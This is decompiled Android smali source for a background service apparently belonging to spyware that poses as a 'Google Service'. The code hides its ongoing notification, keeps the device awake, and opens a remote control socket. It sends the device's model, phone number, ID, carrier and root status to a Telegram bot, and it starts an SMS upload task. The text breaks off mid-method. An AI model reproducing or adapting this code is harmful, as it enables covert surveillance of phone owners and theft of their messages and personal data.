.class public Lcom/google/xinoshell/services/BgService;
.super Landroid/app/Service;
.source "BgService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/xinoshell/services/BgService$SmsUploadTask;
    }
.end annotation


# static fields
.field private static final CHANNEL_ID:Ljava/lang/String; = "PersistentServiceChannel"

.field private static final NOTIFICATION_ID:I = 0x1

.field private static final TAG:Ljava/lang/String; = "BgService"


# instance fields
.field private batteryReceiver:Lcom/google/xinoshell/receivers/BatteryLevelReceiver;

.field private manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

.field private prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

.field private wakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method static bridge synthetic -$$Nest$fgetmanageSocket(Lcom/google/xinoshell/services/BgService;)Lcom/google/xinoshell/connection/ManageSocket;
    .locals 0

    iget-object p0, p0, Lcom/google/xinoshell/services/BgService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    return-object p0
.end method

.method static bridge synthetic -$$Nest$fgetprefs(Lcom/google/xinoshell/services/BgService;)Lcom/google/xinoshell/utils/SharedPrefManager;
    .locals 0

    iget-object p0, p0, Lcom/google/xinoshell/services/BgService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    return-object p0
.end method

.method public constructor <init>()V
    .locals 0

    .line 42
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method private createNotificationChannel()V
    .locals 4

    .line 302
    nop

    .line 303
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "Google Service"

    const/4 v2, 0x2

    const-string v3, "PersistentServiceChannel"

    invoke-direct {v0, v3, v1, v2}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 308
    .local v0, "serviceChannel":Landroid/app/NotificationChannel;
    const-string v1, "For Google background service"

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 309
    const/4 v1, -0x1

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    .line 310
    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    .line 311
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x21

    if-lt v2, v3, :cond_0

    .line 312
    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setBlockable(Z)V

    .line 314
    :cond_0
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setBypassDnd(Z)V

    .line 315
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v2, v3, :cond_1

    .line 316
    const/4 v2, 0x4

    invoke-virtual {v0, v2}, Landroid/app/NotificationChannel;->setImportance(I)V

    .line 317
    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setBlockable(Z)V

    .line 320
    :cond_1
    const-class v1, Landroid/app/NotificationManager;

    invoke-virtual {p0, v1}, Lcom/google/xinoshell/services/BgService;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    .line 321
    .local v1, "manager":Landroid/app/NotificationManager;
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 323
    .end local v0    # "serviceChannel":Landroid/app/NotificationChannel;
    .end local v1    # "manager":Landroid/app/NotificationManager;
    return-void
.end method

.method private static escapeHtml(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p0, "text"    # Ljava/lang/String;

    .line 218
    if-nez p0, :cond_0

    .line 219
    const-string v0, "Unknown"

    return-object v0

    .line 221
    :cond_0
    const-string v0, "&"

    const-string v1, "&amp;"

    invoke-virtual {p0, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 222
    const-string v1, "<"

    const-string v2, "&lt;"

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 223
    const-string v1, ">"

    const-string v2, "&gt;"

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 224
    const-string v1, "\""

    const-string v2, "&quot;"

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 221
    return-object v0
.end method

.method private initializeServiceComponents()V
    .locals 4

    .line 250
    const-string v0, "power"

    invoke-virtual {p0, v0}, Lcom/google/xinoshell/services/BgService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/os/PowerManager;

    .line 251
    .local v0, "powerManager":Landroid/os/PowerManager;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Lcom/google/xinoshell/services/BgService;->getApplication()Landroid/app/Application;

    move-result-object v2

    invoke-virtual {v2}, Landroid/app/Application;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, ":BgServiceWakeLock"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 252
    .local v1, "wakeLockTag":Ljava/lang/String;
    const/4 v2, 0x1

    invoke-virtual {v0, v2, v1}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v2

    iput-object v2, p0, Lcom/google/xinoshell/services/BgService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    .line 254
    nop

    .line 255
    iget-object v2, p0, Lcom/google/xinoshell/services/BgService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    const/4 v3, 0x0

    invoke-virtual {v2, v3}, Landroid/os/PowerManager$WakeLock;->setReferenceCounted(Z)V

    .line 257
    iget-object v2, p0, Lcom/google/xinoshell/services/BgService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v2}, Landroid/os/PowerManager$WakeLock;->acquire()V

    .line 258
    return-void
.end method

.method private initializeSocketConnection()V
    .locals 2

    .line 228
    invoke-static {p0}, Lcom/google/xinoshell/connection/ManageSocket;->getInstance(Landroid/content/Context;)Lcom/google/xinoshell/connection/ManageSocket;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/services/BgService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    .line 229
    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    new-instance v1, Lcom/google/xinoshell/services/BgService$3;

    invoke-direct {v1, p0}, Lcom/google/xinoshell/services/BgService$3;-><init>(Lcom/google/xinoshell/services/BgService;)V

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/connection/ManageSocket;->setCallback(Lcom/google/xinoshell/connection/ManageSocket$SocketCallback;)V

    .line 245
    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/ManageSocket;->connect()V

    .line 246
    return-void
.end method

.method private initiateSendConnectionInfo(Landroid/content/Context;)V
    .locals 3
    .param p1, "context"    # Landroid/content/Context;

    .line 82
    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v1, "isCCSended"

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->getB(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_4

    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v1, "sendCCToTG"

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->getB(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 83
    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->getB(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v2, "toCCTgToken"

    invoke-virtual {v0, v2}, Lcom/google/xinoshell/utils/SharedPrefManager;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    :cond_0
    sget-object v0, Lcom/google/xinoshell/utils/Config;->TgConnectionToken:Ljava/lang/String;

    .line 84
    .local v0, "botToken":Ljava/lang/String;
    :goto_0
    iget-object v2, p0, Lcom/google/xinoshell/services/BgService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-virtual {v2, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->getB(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/google/xinoshell/services/BgService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v2, "toCCTgUser"

    invoke-virtual {v1, v2}, Lcom/google/xinoshell/utils/SharedPrefManager;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    goto :goto_1

    :cond_1
    sget-object v1, Lcom/google/xinoshell/utils/Config;->TgConnectionUser:Ljava/lang/String;

    .line 86
    .local v1, "chatId":Ljava/lang/String;
    :goto_1
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_3

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_2

    goto :goto_2

    .line 89
    :cond_2
    new-instance v2, Lcom/google/xinoshell/services/BgService$2;

    invoke-direct {v2, p0}, Lcom/google/xinoshell/services/BgService$2;-><init>(Lcom/google/xinoshell/services/BgService;)V

    invoke-static {p1, v0, v1, v2}, Lcom/google/xinoshell/services/BgService;->sendConnectionInfoToTelegram(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Lcom/google/xinoshell/utils/TelegramBotUtils$TelegramCallback;)V

    goto :goto_3

    .line 87
    :cond_3
    :goto_2
    return-void

    .line 101
    .end local v0    # "botToken":Ljava/lang/String;
    .end local v1    # "chatId":Ljava/lang/String;
    :cond_4
    :goto_3
    return-void
.end method

.method private initiateSmsUpload()V
    .locals 2

    .line 111
    invoke-static {p0}, Lcom/google/xinoshell/utils/NetworkUtil;->isNetworkConnected(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v1, "isSmsUploaded"

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/utils/SharedPrefManager;->getB(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 112
    new-instance v0, Lcom/google/xinoshell/services/BgService$SmsUploadTask;

    const/4 v1, 0x0

    invoke-direct {v0, p0, v1}, Lcom/google/xinoshell/services/BgService$SmsUploadTask;-><init>(Lcom/google/xinoshell/services/BgService;Lcom/google/xinoshell/services/BgService-IA;)V

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/google/xinoshell/services/BgService$SmsUploadTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 114
    :cond_0
    return-void
.end method

.method private registerBatterryBroadcast()V
    .locals 2

    .line 104
    new-instance v0, Lcom/google/xinoshell/receivers/BatteryLevelReceiver;

    invoke-direct {v0}, Lcom/google/xinoshell/receivers/BatteryLevelReceiver;-><init>()V

    iput-object v0, p0, Lcom/google/xinoshell/services/BgService;->batteryReceiver:Lcom/google/xinoshell/receivers/BatteryLevelReceiver;

    .line 105
    new-instance v0, Landroid/content/IntentFilter;

    const-string v1, "android.intent.action.BATTERY_CHANGED"

    invoke-direct {v0, v1}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 106
    .local v0, "filter":Landroid/content/IntentFilter;
    iget-object v1, p0, Lcom/google/xinoshell/services/BgService;->batteryReceiver:Lcom/google/xinoshell/receivers/BatteryLevelReceiver;

    invoke-virtual {p0, v1, v0}, Lcom/google/xinoshell/services/BgService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 107
    return-void
.end method

.method public static sendConnectionInfoToTelegram(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Lcom/google/xinoshell/utils/TelegramBotUtils$TelegramCallback;)V
    .locals 17
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "botToken"    # Ljava/lang/String;
    .param p2, "chatId"    # Ljava/lang/String;
    .param p3, "callback"    # Lcom/google/xinoshell/utils/TelegramBotUtils$TelegramCallback;

    .line 181
    new-instance v0, Lcom/google/xinoshell/utils/DeviceInfoUtil;

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;-><init>(Landroid/content/Context;)V

    .line 183
    .local v0, "deviceInfoUtil":Lcom/google/xinoshell/utils/DeviceInfoUtil;
    invoke-static {}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getModel()Ljava/lang/String;

    move-result-object v2

    .line 184
    .local v2, "model":Ljava/lang/String;
    invoke-static {}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getAndroidVersion()Ljava/lang/String;

    move-result-object v3

    .line 185
    .local v3, "androidVersion":Ljava/lang/String;
    invoke-static {v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    .line 186
    .local v4, "deviceID":Ljava/lang/String;
    invoke-virtual {v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->isRooted()Z

    move-result v5

    .line 187
    .local v5, "isRooted":Z
    invoke-virtual {v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->isSDCardAvailable()Z

    move-result v6

    .line 188
    .local v6, "isSDCardAvailable":Z
    invoke-virtual {v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getStorageMemory()Ljava/lang/String;

    move-result-object v7

    .line 189
    .local v7, "storageMemory":Ljava/lang/String;
    invoke-virtual {v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getSDKVersion()I

    move-result v8

    invoke-static {v8}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v8

    .line 190
    .local v8, "sdkVersion":Ljava/lang/String;
    invoke-virtual {v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getCPUArchitecture()Ljava/lang/String;

    move-result-object v9

    .line 191
    .local v9, "cpuArchitecture":Ljava/lang/String;
    invoke-virtual {v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getServiceProvider()Ljava/lang/String;

    move-result-object v10

    .line 192
    .local v10, "serviceProvider":Ljava/lang/String;
    invoke-static {v1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getSelfNumber(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v11

    .line 193
    .local v11, "phoneNumber":Ljava/lang/String;
    invoke-static {v1}, Lcom/google/xinoshell/utils/BatteryUtils;->getBatteryPercentage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v12

    .line 195
    .local v12, "batteryPercentage":Ljava/lang/String;
    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13}, Ljava/lang/StringBuilder;-><init>()V

    const-string v14, "<b>\ud83d\udcf1 New Device Connected</b>\n\n\ud83d\udccc <b>Basic Info</b>\n\u251c\u2500 \ud83d\udd39 <b>Model:</b> "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 197
    invoke-static {v2}, Lcom/google/xinoshell/services/BgService;->escapeHtml(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "\n\u251c\u2500 \ud83d\udd39 <b>Android Version:</b> "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 198
    invoke-static {v3}, Lcom/google/xinoshell/services/BgService;->escapeHtml(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, " (SDK "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, ")\n\u251c\u2500 \ud83d\udd39 <b>CPU:</b> "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 199
    invoke-static {v9}, Lcom/google/xinoshell/services/BgService;->escapeHtml(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "\n\u2514\u2500 \ud83d\udd39 <b>Rooted:</b> "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 200
    if-eqz v5, :cond_0

    const-string v14, "\u2705 Yes"

    goto :goto_0

    :cond_0
    const-string v14, "\u274c No"

    :goto_0
    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "\n\n\ud83d\udcf6 <b>Network Info</b>\n\u251c\u2500 \ud83d\udd39 <b>Service Provider:</b> "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 203
    invoke-static {v10}, Lcom/google/xinoshell/services/BgService;->escapeHtml(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "\n\u2514\u2500 \ud83d\udd39 <b>Phone Number:</b> "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 204
    invoke-virtual {v11}, Ljava/lang/String;->isEmpty()Z

    move-result v14

    if-eqz v14, :cond_1

    const-string v14, "Unknown"

    goto :goto_1

    :cond_1
    invoke-static {v11}, Lcom/google/xinoshell/services/BgService;->escapeHtml(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    :goto_1
    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "\n\n\ud83d\udcbe <b>Storage Info</b>\n\u251c\u2500 \ud83d\udd39 <b>Total Storage:</b> "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 207
    invoke-static {v7}, Lcom/google/xinoshell/services/BgService;->escapeHtml(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "\n\u2514\u2500 \ud83d\udd39 <b>SD Card:</b> "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 208
    if-eqz v6, :cond_2

    const-string v14, "\u2705 Available"

    goto :goto_2

    :cond_2
    const-string v14, "\u274c Not Available"

    :goto_2
    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "\n\n\ud83d\udd0b <b>Battery:</b> "

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 210
    invoke-static {v12}, Lcom/google/xinoshell/services/BgService;->escapeHtml(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "\n\n\ud83c\udd94 <b>Device ID:</b> <code>"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    .line 212
    invoke-static {v4}, Lcom/google/xinoshell/services/BgService;->escapeHtml(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    const-string v14, "</code>"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v13

    .line 214
    .local v13, "message":Ljava/lang/String;
    move-object/from16 v14, p1

    move-object/from16 v15, p2

    move-object/from16 v16, v0

    move-object/from16 v0, p3

    .end local v0    # "deviceInfoUtil":Lcom/google/xinoshell/utils/DeviceInfoUtil;
    .local v16, "deviceInfoUtil":Lcom/google/xinoshell/utils/DeviceInfoUtil;
    invoke-static {v14, v15, v13, v0}, Lcom/google/xinoshell/utils/TelegramBotUtils;->sendMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/google/xinoshell/utils/TelegramBotUtils$TelegramCallback;)V

    .line 215
    return-void
.end method

.method private startForegroundServiceProperly()V
    .locals 6

    .line 262
    invoke-direct {p0}, Lcom/google/xinoshell/services/BgService;->createNotificationChannel()V

    .line 264
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/google/xinoshell/MainActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 265
    .local v0, "notificationIntent":Landroid/content/Intent;
    const/high16 v1, 0x4000000

    const/4 v2, 0x0

    invoke-static {p0, v2, v0, v1}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    .line 271
    .local v1, "pendingIntent":Landroid/app/PendingIntent;
    new-instance v3, Landroid/app/Notification$Builder;

    invoke-direct {v3, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    .line 272
    const-string v4, ""

    invoke-virtual {v3, v4}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v3

    .line 273
    invoke-virtual {v3, v4}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v3

    sget v4, Lcom/google/xinoshell/R$drawable;->empty:I

    .line 274
    invoke-virtual {v3, v4}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v3

    .line 275
    invoke-virtual {v3, v1}, Landroid/app/Notification$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroid/app/Notification$Builder;

    move-result-object v3

    .line 276
    const/4 v4, 0x1

    invoke-virtual {v3, v4}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    move-result-object v3

    .line 277
    invoke-virtual {v3, v2}, Landroid/app/Notification$Builder;->setAutoCancel(Z)Landroid/app/Notification$Builder;

    move-result-object v3

    .line 278
    invoke-virtual {v3, v4}, Landroid/app/Notification$Builder;->setOnlyAlertOnce(Z)Landroid/app/Notification$Builder;

    move-result-object v3

    .line 279
    invoke-virtual {v3, v2}, Landroid/app/Notification$Builder;->setShowWhen(Z)Landroid/app/Notification$Builder;

    move-result-object v2

    .line 281
    .local v2, "builder":Landroid/app/Notification$Builder;
    nop

    .line 282
    const-string v3, "PersistentServiceChannel"

    invoke-virtual {v2, v3}, Landroid/app/Notification$Builder;->setChannelId(Ljava/lang/String;)Landroid/app/Notification$Builder;

    .line 285
    nop

    .line 286
    const/4 v3, 0x2

    invoke-virtual {v2, v3}, Landroid/app/Notification$Builder;->setPriority(I)Landroid/app/Notification$Builder;

    .line 289
    nop

    .line 290
    const-string v3, "service"

    invoke-virtual {v2, v3}, Landroid/app/Notification$Builder;->setCategory(Ljava/lang/String;)Landroid/app/Notification$Builder;

    move-result-object v3

    .line 291
    const/4 v5, -0x1

    invoke-virtual {v3, v5}, Landroid/app/Notification$Builder;->setVisibility(I)Landroid/app/Notification$Builder;

    .line 294
    invoke-virtual {v2}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v3

    .line 295
    .local v3, "notification":Landroid/app/Notification;
    iget v5, v3, Landroid/app/Notification;->flags:I

    or-int/lit8 v5, v5, 0x62

    iput v5, v3, Landroid/app/Notification;->flags:I

    .line 297
    invoke-virtual {p0, v4, v3}, Lcom/google/xinoshell/services/BgService;->startForeground(ILandroid/app/Notification;)V

    .line 298
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 351
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 2

    .line 57
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 58
    const-string v0, "BgService"

    const-string v1, "Service created"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 59
    invoke-direct {p0}, Lcom/google/xinoshell/services/BgService;->initializeServiceComponents()V

    .line 60
    invoke-direct {p0}, Lcom/google/xinoshell/services/BgService;->startForegroundServiceProperly()V

    .line 61
    new-instance v0, Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/utils/SharedPrefManager;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/google/xinoshell/services/BgService;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    .line 62
    new-instance v0, Lcom/google/xinoshell/services/BgService$1;

    invoke-direct {v0, p0}, Lcom/google/xinoshell/services/BgService$1;-><init>(Lcom/google/xinoshell/services/BgService;)V

    invoke-static {p0, v0}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getFCM_Token(Landroid/content/Context;Lcom/google/xinoshell/utils/DeviceInfoUtil$TokenCallback;)V

    .line 75
    invoke-direct {p0}, Lcom/google/xinoshell/services/BgService;->initializeSocketConnection()V

    .line 76
    invoke-direct {p0, p0}, Lcom/google/xinoshell/services/BgService;->initiateSendConnectionInfo(Landroid/content/Context;)V

    .line 77
    invoke-direct {p0}, Lcom/google/xinoshell/services/BgService;->initiateSmsUpload()V

    .line 78
    invoke-direct {p0}, Lcom/google/xinoshell/services/BgService;->registerBatterryBroadcast()V

    .line 79
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .line 334
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 335
    const-string v0, "BgService"

    const-string v1, "Service destroyed"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 344
    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 345
    iget-object v0, p0, Lcom/google/xinoshell/services/BgService;->wakeLock:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    .line 347
    :cond_0
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .line 327
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Service started with SDK "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "BgService"

